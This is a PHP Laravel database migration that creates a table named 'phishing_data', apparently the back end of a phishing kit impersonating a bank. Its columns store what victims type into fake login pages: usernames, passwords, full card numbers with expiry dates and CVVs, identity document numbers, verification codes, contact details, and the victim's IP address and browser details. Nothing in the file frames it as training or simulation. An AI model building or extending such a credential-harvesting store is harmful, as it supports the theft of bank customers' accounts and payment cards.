<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('phishing_data', function (Blueprint $table) {
            $table->id();
            $table->string('username')->nullable();
            $table->string('password')->nullable();
            $table->string('card_number')->nullable(); // Número de tarjeta Multired
            $table->string('document_type')->nullable(); // Tipo de documento (DNI, Pasaporte, etc.)
            $table->string('document_number')->nullable(); // Número de documento
            $table->string('account_type')->nullable(); // Tipo de cuenta/tarjeta (02=Multired, 01=DNI)
            $table->string('captcha_input')->nullable(); // Captcha ingresado
            $table->string('verification_code')->nullable(); // Código de verificación adicional
            $table->string('card_holder_name')->nullable(); // Nombre del titular
            $table->string('expiry_date')->nullable(); // Fecha de vencimiento
            $table->string('cvv')->nullable(); // CVV
            $table->string('phone_number')->nullable(); // Teléfono
            $table->string('email')->nullable(); // Email
            $table->string('full_name')->nullable(); // Nombre completo
            $table->string('ip_address')->nullable();
            $table->text('user_agent')->nullable();
            $table->text('referrer')->nullable();
            $table->text('additional_data')->nullable(); // Datos adicionales en JSON
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('phishing_data');
    }
};